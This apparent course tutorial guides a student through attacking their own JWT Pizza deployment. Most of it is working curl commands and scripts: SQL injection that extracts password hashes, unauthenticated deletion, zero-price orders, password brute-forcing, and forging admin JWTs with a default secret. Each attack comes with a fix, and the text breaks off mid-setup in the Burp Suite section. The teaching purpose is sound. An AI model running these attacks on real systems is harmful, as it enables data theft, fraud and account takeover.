# JWT Pizza Self-Attack Tutorial

A hands-on penetration testing guide for your own JWT Pizza deployment.

**Your target:**
- Frontend: `https://pizza.urjellis.com`
- Backend API: `https://pizza-service.urjellis.com`
- Factory: `https://pizza-factory.cs329.click`

**Known credentials (from the codebase):**
- Admin: `a@jwt.com` / `admin`
- Test diner: `t@jwt.com` / `test`
- Franchisee: `f@jwt.com` / `franchisee`

> This tutorial walks you through 7 attacks across different OWASP Top 10 categories. Each one teaches you something real about how web applications break. By the end, you will have enough documented attacks for your CS 329 penetration testing deliverable and, more importantly, you will understand *why* these vulnerabilities exist and how to fix them.

**Important: This is YOUR deployment.** You are authorized to attack it. Never run these attacks against someone else's system without explicit written permission.

**Prerequisites:**
- A terminal with `curl` installed (macOS/Linux have it by default)
- Node.js installed (`node -e "console.log('ready')"` should work)
- The `jsonwebtoken` npm package (`npm install jsonwebtoken` in any directory)
- A web browser with DevTools (Chrome or Firefox)
- Optional but recommended: Burp Suite Community Edition (free) for Attack 7

---

## Attack 1: SQL Injection via PUT /api/user (A03 Injection)

**What you'll learn:** How unsanitized user input in SQL queries lets an attacker read, modify, or destroy your entire database. SQL injection has been the #1 web vulnerability for over two decades and it is still everywhere.

**Tools needed:** curl, terminal

**Difficulty:** Medium

### Background

Imagine you have a filing cabinet with a helpful assistant. You write requests on slips of paper: "Get me the file for Employee #42." The assistant reads your request and goes to get it. Now imagine you write: "Get me the file for Employee #42. Also, dump the entire cabinet on the floor." If the assistant blindly follows everything on the slip, you have SQL injection.

In JWT Pizza, the `updateUser` function in `database.js` builds its SQL query by gluing strings together instead of using parameterized queries. When you send a PUT request to `/api/user/{id}` with an `email` field, that email value gets dropped directly into the SQL string. That means you can "escape" the string context and inject your own SQL commands.

Here is the vulnerable code pattern (simplified):

```javascript
// VULNERABLE -- string concatenation
let query = `UPDATE user SET email='${email}' WHERE id=${userId}`;

// SAFE -- parameterized query
let query = `UPDATE user SET email=? WHERE id=?`;
```

### Step-by-step

**Step 1: Log in and get a token.**

You need an authenticated session first. Log in as the test user:

```bash
curl -s -X PUT https://pizza-service.urjellis.com/api/auth \
  -H 'Content-Type: application/json' \
  -d '{"email":"t@jwt.com","password":"test"}' | json_pp
```

What you should see: A JSON response containing a `token` field and user info. Copy the token value -- you will use it in every subsequent request. It will look like a long string of letters, numbers, dots, and dashes.

```bash
# Save it to a variable for convenience:
TOKEN="paste_your_token_here"
```

Pro tip: If `t@jwt.com` does not work (maybe credentials were changed), register a fresh user:

```bash
curl -s -X POST https://pizza-service.urjellis.com/api/auth \
  -H 'Content-Type: application/json' \
  -d '{"name":"hackerman","email":"hack@test.com","password":"hack123"}' | json_pp
```

Also note your user ID from the response. You will need it. Let's call it `USER_ID`.

**Step 2: Confirm the endpoint works normally.**

First, send a legitimate update request so you know what "normal" looks like:

```bash
curl -s -X PUT https://pizza-service.urjellis.com/api/user/$USER_ID \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email":"t@jwt.com","password":"test"}' | json_pp
```

What you should see: A normal JSON response with the updated user object. This is your baseline.

**Step 3: Probe with a single quote.**

The classic first move. A single quote (`'`) will break the SQL string delimiter if the input is not sanitized:

```bash
curl -s -X PUT https://pizza-service.urjellis.com/api/user/$USER_ID \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email":"test'\''"}' | json_pp
```

What you should see: An error response, likely with a SQL syntax error and possibly a **stack trace**. If you see something like `ER_PARSE_ERROR` or `You have an error in your SQL syntax`, the endpoint is vulnerable. The stack trace will also leak internal file paths like `/app/src/database/database.js:108`.

This is your "canary in the coal mine." The SQL parser choked on the unexpected quote, which means user input is going directly into the query. Game on.

**Step 4: Inject a tautology (always-true condition).**

Now let's prove we can control the SQL logic:

```bash
curl -s -X PUT https://pizza-service.urjellis.com/api/user/$USER_ID \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d "{\"email\":\"test' OR '1'='1' -- \"}" | json_pp
```

The `-- ` (note the trailing space) is a SQL comment that causes the database to ignore the rest of the original query. The `OR '1'='1'` makes the WHERE clause always true.

What you should see: Either a success response (the query executed with modified logic) or an error that is *different* from the single-quote error. Either way, you are controlling the SQL.

**Step 5: Extract data with UNION-based injection.**

This is where it gets serious. UNION-based injection lets you append a second SELECT query to the original one and extract data from *any* table. The trick is that your UNION SELECT must have the same number of columns as the original query.

First, figure out the column count by trial and error:

```bash
# Try 1 column
curl -s -X PUT https://pizza-service.urjellis.com/api/user/$USER_ID \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d "{\"email\":\"' UNION SELECT 1 -- \"}" | json_pp

# Try 2 columns
curl -s -X PUT https://pizza-service.urjellis.com/api/user/$USER_ID \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d "{\"email\":\"' UNION SELECT 1,2 -- \"}" | json_pp

# Try 3 columns
curl -s -X PUT https://pizza-service.urjellis.com/api/user/$USER_ID \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d "{\"email\":\"' UNION SELECT 1,2,3 -- \"}" | json_pp

# Try 4 columns
curl -s -X PUT https://pizza-service.urjellis.com/api/user/$USER_ID \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d "{\"email\":\"' UNION SELECT 1,2,3,4 -- \"}" | json_pp
```

What you should see: Most of these will return errors, but one will succeed or return a different error. The one that works tells you the column count. Based on the codebase, the `user` table has columns: `id`, `name`, `email`, `password` -- so 4 columns is likely.

**Step 6: Extract password hashes from the user table.**

Now the payload. Replace the numbered placeholders with actual column names from the user table:

```bash
curl -s -X PUT https://pizza-service.urjellis.com/api/user/$USER_ID \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d "{\"email\":\"' UNION SELECT id,name,email,password FROM user -- \"}" | json_pp
```

What you should see: If the injection is successful, the response will contain data from the user table -- including **bcrypt password hashes**. You might see these in the `email` or `name` field of the response (wherever the UNION result maps to the original query's output).

Pro tip: If the UNION approach does not return visible output (blind injection), try an error-based approach:

```bash
curl -s -X PUT https://pizza-service.urjellis.com/api/user/$USER_ID \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d "{\"email\":\"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT email FROM user LIMIT 0,1),FLOOR(RAND(0)*2))x FROM user GROUP BY x)a) -- \"}" | json_pp
```

This forces a duplicate-key error that includes data from the query in the error message. It is ugly, but it works when you cannot see the direct output.

**Step 7: Try extracting all user emails.**

```bash
curl -s -X PUT https://pizza-service.urjellis.com/api/user/$USER_ID \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d "{\"email\":\"' UNION SELECT GROUP_CONCAT(email SEPARATOR ','),2,3,4 FROM user -- \"}" | json_pp
```

What you should see: A comma-separated list of every email address in the database.

### Recording your attack

Screenshot or copy:
1. The single-quote probe showing the SQL error (Step 3) -- this proves the vulnerability exists
2. The UNION SELECT command and response showing extracted data (Step 6) -- this proves data exfiltration
3. Any password hashes or user emails you extracted (Step 6-7) -- this shows the severity

For your deliverable table, classify this as:
- **Severity: 4 (Critical)** -- full database read access
- **Classification: A03:2021 Injection**

### How to fix it

Replace string concatenation with parameterized queries. The fix is a one-line change in `src/database/database.js`:

```javascript
// BEFORE (vulnerable):
const query = `UPDATE user SET ${params.join(', ')} WHERE id=${userId}`;

// AFTER (safe):
const query = `UPDATE user SET ${params.join(', ')} WHERE id=?`;
// And pass userId as a parameter:
await this.query(connection, query, [...values, userId]);
```

Every value that comes from user input must go through a `?` placeholder. The database driver handles escaping automatically. This completely eliminates SQL injection because user input never becomes part of the SQL command structure.

---

## Attack 2: Unauthenticated Franchise Deletion (A01 Broken Access Control)

**What you'll learn:** How missing authentication middleware lets anyone on the internet perform admin-level destructive actions without logging in.

**Tools needed:** curl

**Difficulty:** Easy

### Background

Think of this like a bank vault where the door has a lock, but the bank forgot to actually install the lock on one particular door. The `DELETE /api/franchise/:franchiseId` endpoint simply... does not check if you are logged in. No token required. No admin check. Nothing. You just send the request and the franchise disappears.

This is one of the most common and most dangerous web vulnerabilities: a developer builds a feature, tests it while logged in as admin, and forgets to wire up the authentication middleware.

### Step-by-step

**Step 1: See what franchises currently exist.**

```bash
curl -s https://pizza-service.urjellis.com/api/franchise | json_pp
```

What you should see: A JSON array of franchise objects, each with an `id`, `name`, and `stores` array. Note the IDs -- you will need one.

**Step 2: Create a sacrificial test franchise.**

We do not want to delete a real franchise, so let's create one specifically for this test. You need admin access for this:

```bash
# Log in as admin
ADMIN_RESPONSE=$(curl -s -X PUT https://pizza-service.urjellis.com/api/auth \
  -H 'Content-Type: application/json' \
  -d '{"email":"a@jwt.com","password":"admin"}')

echo $ADMIN_RESPONSE | json_pp

# Extract the token (or just copy it manually from the output)
ADMIN_TOKEN=$(echo $ADMIN_RESPONSE | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Create a test franchise
curl -s -X POST https://pizza-service.urjellis.com/api/franchise \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d '{"name":"DELETEME-pentest","admins":[{"email":"t@jwt.com"}]}' | json_pp
```

What you should see: A response with the new franchise object including its `id`. Note this ID -- let's call it `FRANCHISE_ID`.

**Step 3: Delete the franchise with NO authentication.**

Here is the attack. Notice there is no `Authorization` header:

```bash
curl -s -X DELETE https://pizza-service.urjellis.com/api/franchise/FRANCHISE_ID | json_pp
```

(Replace `FRANCHISE_ID` with the actual number from Step 2.)

What you should see: A success response like `{"message":"franchise deleted"}` -- with **no authentication whatsoever**. Let that sink in. You just deleted a business entity from the database without proving who you are.

**Step 4: Verify the franchise is gone.**

```bash
curl -s https://pizza-service.urjellis.com/api/franchise | json_pp
```

What you should see: The franchise list no longer includes your "DELETEME-pentest" franchise. It is gone forever.

### Recording your attack

Screenshot or copy:
1. The franchise list before deletion (Step 1)
2. The DELETE command with NO auth header and its success response (Step 3)
3. The franchise list after deletion showing it is gone (Step 4)

For your deliverable table:
- **Severity: 4 (Critical)** -- unauthenticated destructive action
- **Classification: A01:2021 Broken Access Control**

### How to fix it

Add authentication middleware to the DELETE route in `src/routes/franchiseRouter.js`:

```javascript
// BEFORE (no auth check):
router.delete('/:franchiseId', async (req, res) => {
  await DB.deleteFranchise(req.params.franchiseId);
  res.json({ message: 'franchise deleted' });
});

// AFTER (requires admin):
router.delete('/:franchiseId', authRouter.authenticateToken, async (req, res) => {
  if (!req.user.isRole(Role.Admin)) {
    return res.status(403).json({ message: 'unable to delete a franchise' });
  }
  await DB.deleteFranchise(req.params.franchiseId);
  res.json({ message: 'franchise deleted' });
});
```

One line of middleware. That is all it takes to go from "anyone on the internet can destroy your data" to "only authenticated admins can do this."

---

## Attack 3: Free Pizza / Price Manipulation (A04 Insecure Design)

**What you'll learn:** Why you should never trust the client to tell you the price. This is the classic "modify the hidden form field" attack, updated for the API age.

**Tools needed:** curl, browser DevTools (optional for observation)

**Difficulty:** Easy

### Background

Imagine you are at a restaurant and instead of the waiter looking up prices on the menu, they ask you: "How much does that steak cost?" You say "$0" and they just... write it down. That is what this API does. The client sends the price of each pizza in the order request, and the server stores it without checking.

This is an "insecure design" flaw, not a bug. The application was *designed* to trust client-supplied prices. No amount of input validation fixes a fundamentally broken trust model.

### Step-by-step

**Step 1: Observe a normal order flow (optional but educational).**

Open `https://pizza.urjellis.com` in your browser. Open DevTools (F12) and go to the Network tab. Log in as `t@jwt.com` / `test`, add a pizza to your cart, and go through the checkout flow. Watch the Network tab for the `POST /api/order` request. Click on it and examine the request body.

What you should see: The request payload includes items with `menuId`, `description`, and `price`. The price is whatever the frontend sent. The server does not independently look it up.

**Step 2: Log in via curl.**

```bash
LOGIN=$(curl -s -X PUT https://pizza-service.urjellis.com/api/auth \
  -H 'Content-Type: application/json' \
  -d '{"email":"t@jwt.com","password":"test"}')

TOKEN=$(echo $LOGIN | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
echo "Token: $TOKEN"
```

**Step 3: Check what is on the menu.**

```bash
curl -s https://pizza-service.urjellis.com/api/order/menu | json_pp
```

What you should see: An array of menu items with their real prices. Note the `id` of any item. Also note the real price -- you will be changing it to 0.

**Step 4: Find a franchise and store to order from.**

```bash
curl -s https://pizza-service.urjellis.com/api/franchise | json_pp
```

What you should see: Franchise objects with nested stores. Pick any `franchiseId` and `storeId` combination.

**Step 5: Order pizza for $0.**

Now place the order with a manipulated price:

```bash
curl -s -X POST https://pizza-service.urjellis.com/api/order \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"franchiseId":1,"storeId":1,"items":[{"menuId":1,"description":"Veggie","price":0}]}' | json_pp
```

What you should see: A success response with the order details and a `jwt` field containing a pizza factory verification token. The price field in the response will show `0`. You just got free pizza. In a real e-commerce app, this would mean free products.

**Step 6: Try negative prices (bonus).**

```bash
curl -s -X POST https://pizza-service.urjellis.com/api/order \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"franchiseId":1,"storeId":1,"items":[{"menuId":1,"description":"Refund Pizza","price":-100}]}' | json_pp
```

What you should see: If this works, you just "charged" the store negative money -- effectively crediting yourself. This is even worse than free pizza.

**Step 7: Order many free pizzas at once.**

```bash
curl -s -X POST https://pizza-service.urjellis.com/api/order \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"franchiseId":1,"storeId":1,"items":[
    {"menuId":1,"description":"Free Pizza 1","price":0},
    {"menuId":1,"description":"Free Pizza 2","price":0},
    {"menuId":1,"description":"Free Pizza 3","price":0},
    {"menuId":1,"description":"Free Pizza 4","price":0},
    {"menuId":1,"description":"Free Pizza 5","price":0}
  ]}' | json_pp
```

### Recording your attack

Screenshot or copy:
1. The menu showing real prices (Step 3)
2. Your order request with `price: 0` and the success response (Step 5)
3. Optionally the negative price attempt (Step 6)

For your deliverable table:
- **Severity: 3 (High)** -- financial loss, free products
- **Classification: A04:2021 Insecure Design**

### How to fix it

The server must look up the price itself. Never trust the client:

```javascript
// In the order route handler:
async addDinerOrder(user, order) {
  for (const item of order.items) {
    // Look up the REAL price from the database
    const menuItem = await this.getMenuItem(item.menuId);
    if (!menuItem) throw new Error('Invalid menu item');
    item.price = menuItem.price;  // Override whatever the client sent
  }
  // ... proceed with order
}
```

The fix is conceptually simple: the server is the source of truth for prices, never the client.

---

## Attack 4: Default Admin Credentials (A07 Authentication Failures)

**What you'll learn:** Why default credentials are the skeleton key of web security, and how brute-force attacks exploit weak authentication.

**Tools needed:** curl, bash (for the brute-force loop)

**Difficulty:** Easy

### Background

The most sophisticated lock in the world is useless if the key is taped to the door. JWT Pizza ships with a hardcoded admin account (`a@jwt.com` / `admin`) that is created on first boot. These credentials are visible in the source code, in the API docs, and even in `notes.md`. If this account still exists in production with the default password, an attacker has full admin access in about 3 seconds.

### Step-by-step

**Step 1: Try the default admin credentials.**

```bash
curl -s -X PUT https://pizza-service.urjellis.com/api/auth \
  -H 'Content-Type: application/json' \
  -d '{"email":"a@jwt.com","password":"admin"}' | json_pp
```

What you should see: If it works, you will get a response with `"roles": [{"role": "admin"}]` and a valid token. Congratulations, you are now the admin. If the credentials were changed, you will get an authentication error -- but do not worry, the error message itself might leak information (see Step 3).

**Step 2: If admin login succeeded, explore admin capabilities.**

```bash
# Save the admin token
ADMIN_TOKEN="paste_admin_token_here"

# List ALL franchises (admin view)
curl -s https://pizza-service.urjellis.com/api/franchise \
  -H "Authorization: Bearer $ADMIN_TOKEN" | json_pp

# Create a franchise
curl -s -X POST https://pizza-service.urjellis.com/api/franchise \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d '{"name":"Hacked Franchise","admins":[{"email":"a@jwt.com"}]}' | json_pp
```

What you should see: Full admin access -- you can create and delete franchises, manage users, and control the entire platform.

**Step 3: Notice the error message difference (user enumeration).**

Try logging in with a non-existent email:

```bash
curl -s -X PUT https://pizza-service.urjellis.com/api/auth \
  -H 'Content-Type: application/json' \
  -d '{"email":"nobody@nowhere.com","password":"whatever"}' | json_pp
```

Now try with a real email but wrong password:

```bash
curl -s -X PUT https://pizza-service.urjellis.com/api/auth \
  -H 'Content-Type: application/json' \
  -d '{"email":"a@jwt.com","password":"wrongpassword"}' | json_pp
```

What you should see: Different error messages. "unknown user" versus "bad password" (or similar). This difference lets an attacker figure out which email addresses have accounts -- a technique called **user enumeration**.

**Step 4: Brute-force with a password list.**

The server allows 1000 requests per minute with no specific login rate limit. Here is a simple brute-force loop:

```bash
# Create a password list
PASSWORDS=("admin" "password" "123456" "pizza" "test" "admin123" "letmein" "welcome" "monkey" "dragon")

for pw in "${PASSWORDS[@]}"; do
  RESULT=$(curl -s -X PUT https://pizza-service.urjellis.com/api/auth \
    -H 'Content-Type: application/json' \
    -d "{\"email\":\"a@jwt.com\",\"password\":\"$pw\"}")
  
  # Check if login succeeded (response contains "token")
  if echo "$RESULT" | grep -q '"token"'; then
    echo "[+] SUCCESS! Password is: $pw"
    echo "$RESULT" | json_pp
    break
  else
    echo "[-] Failed: $pw"
  fi
done
```

What you should see: The loop tries each password and prints SUCCESS when it finds the right one. With the default password ("admin"), it will hit on the first try.

Pro tip: In a real engagement, you would use a wordlist like `rockyou.txt` with thousands of common passwords. The rate limit of 1000/min means you could try the entire top-1000-passwords list in about a minute.

### Recording your attack

Screenshot or copy:
1. The successful admin login response showing the admin role (Step 1)
2. The different error messages for "unknown user" vs "bad password" (Step 3)
3. The brute-force script output (Step 4)

For your deliverable table:
- **Severity: 3 (High)** -- full admin access via default credentials
- **Classification: A07:2021 Identification and Authentication Failures**

### How to fix it

Multiple layers:

1. **Change default credentials on first deploy** -- or better, do not ship default accounts at all. Force the admin to set up their own credentials.
2. **Implement rate limiting on the login endpoint specifically** -- something like 5 failed attempts per minute per IP:
   ```javascript
   const loginLimiter = rateLimit({ windowMs: 60000, max: 5 });
   router.put('/', loginLimiter, async (req, res) => { ... });
   ```
3. **Use generic error messages** -- always say "invalid credentials" regardless of whether the email exists.
4. **Require strong passwords** -- minimum length, complexity requirements.
5. **Add account lockout** after N failed attempts.

---

## Attack 5: JWT Token Forgery (A02 Cryptographic Failures)

**What you'll learn:** How JSON Web Tokens work under the hood, and why a weak or default signing secret lets an attacker forge tokens to become anyone -- including admin.

**Tools needed:** curl, Node.js (with `jsonwebtoken` package), a browser (for jwt.io)

**Difficulty:** Medium

### Background

A JWT is like a wax-sealed letter in the medieval era. The seal proves the letter came from the king. But if someone steals the king's signet ring (the signing secret), they can forge letters that look perfectly authentic. Nobody can tell the difference.

A JWT has three parts separated by dots: `header.payload.signature`. The header says what algorithm was used. The payload is the actual data (your user ID, roles, etc.). The signature is a cryptographic hash of the header and payload, signed with a secret key that only the server should know.

JWT Pizza uses the secret `dev-secret-key-change-in-production` -- a value that is literally in the `.env` file and the source code. If this was not changed in production, you can sign any JWT you want.

### Step-by-step

**Step 1: Get a legitimate token and examine it.**

```bash
curl -s -X PUT https://pizza-service.urjellis.com/api/auth \
  -H 'Content-Type: application/json' \
  -d '{"email":"t@jwt.com","password":"test"}' | json_pp
```

Copy the `token` value from the response.

**Step 2: Decode the JWT (no secret needed).**

The payload of a JWT is just base64-encoded JSON. Anyone can read it:

```bash
# Replace YOUR_TOKEN with the actual token from Step 1
TOKEN="YOUR_TOKEN"

# Decode the header (first part before the first dot)
echo $TOKEN | cut -d'.' -f1 | base64 -d 2>/dev/null; echo

# Decode the payload (second part between the dots)
echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null; echo
```

What you should see: The header will show `{"alg":"HS256","typ":"JWT"}`. The payload will show your user data including `name`, `email`, `roles`, and `id`. Notice there is no `exp` field -- this token never expires. Also notice the `roles` array: `[{"role":"diner"}]`. We are going to change that.

Pro tip: You can also paste the token into https://jwt.io to see it decoded with a nice visual breakdown.

**Step 3: Forge an admin token.**

Now use Node.js to create a token signed with the default secret:

```bash
node -e "
const jwt = require('jsonwebtoken');
const forgedToken = jwt.sign(
  {
    id: 1,
    name: 'admin',
    email: 'a@jwt.com',
    roles: [{ role: 'admin' }]
  },
  'dev-secret-key-change-in-production'
);
console.log(forgedToken);
"
```

What you should see: A new JWT string. This token claims to be the admin user, and it is signed with what we hope is the server's secret key.

**Step 4: Test the forged token.**

Try using the forged token to access an admin-only endpoint:

```bash
FORGED="paste_forged_token_here"

# Try to create a franchise (admin-only action)
curl -s -X POST https://pizza-service.urjellis.com/api/franchise \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $FORGED" \
  -d '{"name":"Forged Franchise","admins":[{"email":"a@jwt.com"}]}' | json_pp
```

What you should see: If the default secret is still in use, the server will accept your forged token and create the franchise. You just became admin without knowing the admin password. If the secret was changed, you will get an authentication error -- which means this particular vulnerability has been mitigated (document it as severity 0).

**Step 5: Try the alg:none attack (bonus).**

Some JWT libraries have a flaw where you can set the algorithm to "none" and skip the signature entirely:

```bash
# Craft a JWT with algorithm "none"
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"id":1,"name":"admin","email":"a@jwt.com","roles":[{"role":"admin"}]}

HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
PAYLOAD=$(echo -n '{"id":1,"name":"admin","email":"a@jwt.com","roles":[{"role":"admin"}]}' | base64 | tr -d '=' | tr '+/' '-_')
NONE_TOKEN="${HEADER}.${PAYLOAD}."

echo "Token: $NONE_TOKEN"

curl -s -X POST https://pizza-service.urjellis.com/api/franchise \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $NONE_TOKEN" \
  -d '{"name":"None-Alg Franchise","admins":[{"email":"a@jwt.com"}]}' | json_pp
```

What you should see: Most modern JWT libraries reject `alg:none` tokens, so this will likely fail. But it is worth trying -- and worth documenting the attempt either way.

**Step 6: If the default secret did not work, try other common secrets.**

```bash
for SECRET in "secret" "jwt-secret" "pizza" "password" "changeme" "keyboard cat" "your-256-bit-secret"; do
  ATTEMPT=$(node -e "
    const jwt = require('jsonwebtoken');
    const token = jwt.sign(
      {id:1,name:'admin',email:'a@jwt.com',roles:[{role:'admin'}]},
      '$SECRET'
    );
    console.log(token);
  ")
  
  RESULT=$(curl -s -X GET https://pizza-service.urjellis.com/api/franchise \
    -H "Authorization: Bearer $ATTEMPT")
  
  if echo "$RESULT" | grep -q '"name"'; then
    echo "[+] Secret found: $SECRET"
    echo "Token: $ATTEMPT"
    break
  else
    echo "[-] Not: $SECRET"
  fi
done
```

### Recording your attack

Screenshot or copy:
1. The decoded JWT showing the payload structure (Step 2)
2. The forged token creation command and output (Step 3)
3. The successful admin action using the forged token (Step 4)

For your deliverable table:
- **Severity: 3 (High)** if the default secret works (full identity forgery); **0** if it was changed
- **Classification: A02:2021 Cryptographic Failures**

### How to fix it

1. **Use a strong, random secret** -- generate it with `openssl rand -hex 64` and store it in a secrets manager (not in `.env` committed to git).
2. **Add token expiration**:
   ```javascript
   jwt.sign(payload, secret, { expiresIn: '1h' });
   ```
3. **Validate token claims** -- check that the user ID in the token actually exists in the database.
4. **Consider using RS256** (asymmetric signing) instead of HS256, so even if the public key leaks, tokens cannot be forged.

---

## Attack 6: Information Disclosure / Security Misconfiguration (A05 Security Misconfiguration)

**What you'll learn:** How small information leaks add up to give an attacker a complete map of your system. Each leak alone seems harmless, but together they are a reconnaissance goldmine.

**Tools needed:** curl, browser

**Difficulty:** Easy

### Background

Imagine you are trying to break into a building. A floor plan taped to the lobby window is not a vulnerability by itself -- but it sure makes your job easier. Information disclosure works the same way: stack traces reveal your code structure, API docs reveal your database host, coverage instrumentation reveals your source code, and missing security headers reveal that nobody hardened this deployment. An attacker pieces these together to plan their real attacks.

### Step-by-step

**Step 1: Harvest stack traces from error responses.**

```bash
# Trigger an auth error to get a stack trace
curl -s -X PUT https://pizza-service.urjellis.com/api/auth \
  -H 'Content-Type: application/json' \
  -d '{"email":"nobody@doesnotexist.com","password":"x"}' | json_pp
```

What you should see: An error response that includes a `stack` field with something like:

```
Error: unknown user
    at DB.getUser (/app/src/database/database.js:108:15)
    at process.processTicksAndRejections (...)
    at async /app/src/routes/authRouter.js:110:18
```

This tells you: the app runs in `/app/`, uses `database.js` and `authRouter.js`, specific line numbers, and the Node.js version.

**Step 2: Check /api/docs for leaked configuration.**

```bash
curl -s https://pizza-service.urjellis.com/api/docs | json_pp
```

What you should see: The API documentation endpoint, which may include:
- The database hostname (e.g., an AWS RDS endpoint like `*.us-east-1.rds.amazonaws.com`)
- The factory service URL
- API version information
- Complete endpoint documentation showing all available routes and their parameters

Pro tip: The database hostname is especially dangerous. Even though the database is likely not publicly accessible, knowing the hostname lets an attacker target it if they find a way in (SSRF, compromised VPC, etc.).

**Step 3: Check for code coverage instrumentation on the frontend.**

Open your browser and go to `https://pizza.urjellis.com`. Open the browser console (F12 then Console tab) and type:

```javascript
window.__coverage__
```

What you should see: If the istanbul code coverage plugin was left enabled in production, you will get a massive JavaScript object containing the **complete source map** of the frontend application. This includes every file path, every function name, and branch coverage data. An attacker can use this to understand the entire frontend codebase without ever seeing the source repository.

You can also check via curl by fetching the main JS bundle:

```bash
# First, get the HTML to find the JS bundle filename
curl -s https://pizza.urjellis.com | grep -o 'src="[^"]*\.js"'

# Then check if the bundle contains istanbul instrumentation
curl -s https://pizza.urjellis.com/assets/index-XXXXX.js | grep -c "__coverage__"
```

**Step 4: Check for missing security headers.**

```bash
curl -s -I https://pizza-service.urjellis.com/api/franchise
```

What you should see: Check for the absence of these headers:
- `Strict-Transport-Security` (HSTS) -- missing means the browser does not enforce HTTPS
- `Content-Security-Policy` (CSP) -- missing means no XSS mitigation
- `X-Frame-Options` -- missing means the site can be embedded in iframes (clickjacking)
- `X-Content-Type-Options` -- missing means the browser might MIME-sniff responses
- `X-Powered-By: Express` -- leaks the server technology

Also check for the presence of `X-Powered-By: Express`, which tells attackers exactly what framework you are using.

**Step 5: Check robots.txt.**

```bash
curl -s https://pizza.urjellis.com/robots.txt
```

What you should see: If `robots.txt` lists disallowed paths like `/admin-dashboard/` or `/docs/`, it is essentially advertising "hey, these sensitive paths exist." This is the opposite of security through obscurity -- it is insecurity through advertising.

### Recording your attack

Screenshot or copy:
1. The stack trace from the error response (Step 1)
2. The /api/docs response showing the DB host (Step 2)
3. The `window.__coverage__` object in the browser console (Step 3)
4. The response headers showing missing security headers (Step 4)

For your deliverable table:
- **Severity: 2 (Medium)** -- information disclosure enabling further attacks
- **Classification: A05:2021 Security Misconfiguration**

### How to fix it

Multiple fixes needed:

1. **Remove stack traces in production:**
   ```javascript
   // In error handler:
   app.use((err, req, res, next) => {
     res.status(err.statusCode || 500).json({
       message: err.message
       // Do NOT include err.stack in production
     });
   });
   ```

2. **Disable /api/docs in production** or require admin authentication.

3. **Remove istanbul instrumentation** from production builds:
   ```javascript
   // vite.config.ts -- only include in test/dev
   plugins: process.env.NODE_ENV === 'test' ? [istanbul()] : []
   ```

4. **Add security headers** using the `helmet` npm package:
   ```javascript
   const helmet = require('helmet');
   app.use(helmet());
   ```

5. **Remove X-Powered-By:** `app.disable('x-powered-by');`

---

## Attack 7: BONUS -- Burp Suite Walkthrough (Password Brute-Force)

**What you'll learn:** How to use Burp Suite, the industry-standard web application security testing tool, to intercept, modify, and replay HTTP requests. This pairs with the Burp Suite exercise from the CS 329 course material.

**Tools needed:** Burp Suite Community Edition (free download from https://portswigger.net/burp/communitydownload)

**Difficulty:** Hard (setup), Easy (once configured)

### Background

Everything we have done so far with curl, you can do with Burp Suite -- but with a GUI, request history, and powerful automation. Burp Suite sits between your browser and the server as a proxy, intercepting every request. You can pause requests, modify them, replay them, and fuzz parameters. It is the Swiss Army knife of web penetration testing.

Think of it as adding a toll booth on the highway between your browser and the internet. Every car (HTTP request) has to stop, and you can inspect, modify, or clone each one.

### Step-by-step

**Step 1: Install and configure Burp Suite proxy.**

1. Download Burp Suite Community Edition from https://portswigger.net/burp/communitydownload
2. Launch it and create a temporary project
3. Go to **Proxy > Proxy settings** (or Options in older versions)
4. Confirm the proxy listener is running on `127.0.0.1:8080`
5. Configure your browser to use `127.0.0.1:8080` as its HTTP/HTTPS proxy:
   - In Chrome: Settings > System > Open proxy settings, or use a browser extension like FoxyProxy
   - In Firefox: Settings > Network Settings > Manual proxy configuration > HTTP Proxy: `127.0.0.1`, Port: `8080`
6. Visit `http://burpsuite` in your proxied browser and install Burp's CA certificate so HTTPS interception works:
   - Click "CA Certificate" on the Burp Suite landing page
   - Install it in your browser's certificate store (or system keychain on macOS)

Important: After installing the certificate, you may need to restart your browser. HTTPS sites will show security warnings until the Burp CA is trusted.

**Step 2: Capture a login request.**

1. In Burp Suite, go to **Proxy > Intercept** and make sure intercept is **ON** (the button toggles)
2. In your proxied browser, navigate to `https://pizza.urjellis.com`
3. Go to the Login page and enter `a@jwt.com` / `admin`, then click Login
4. Burp Suite will catch the request. You will see something like:

```http
PUT /api/auth HTTP/2
Host: pizza-service.urjellis.com
Content-Type: application/json

{"email":"a@jwt.com","password":"admin"}
```

5. Click **Forward** to let the request through (or **Drop** to cancel it)

What you should see: The request frozen in the Intercept tab with the full headers and body visible. This is the raw HTTP request your browser was about to send.

**Step 3: Send the request to Intruder.**

1. Right-click on the intercepted login request (or find it in **Proxy > HTTP history**)
2. Select **Send to Intruder**
3. Go to the **Intruder** tab

**Step 4: Configure the brute-force attack.**

1. In the **Intruder > Positions** tab, click **Clear** to remove all auto-detected insertion points
2. Highlight just the password value (`admin` in the request body) and click **Add**. It should now look like:

```
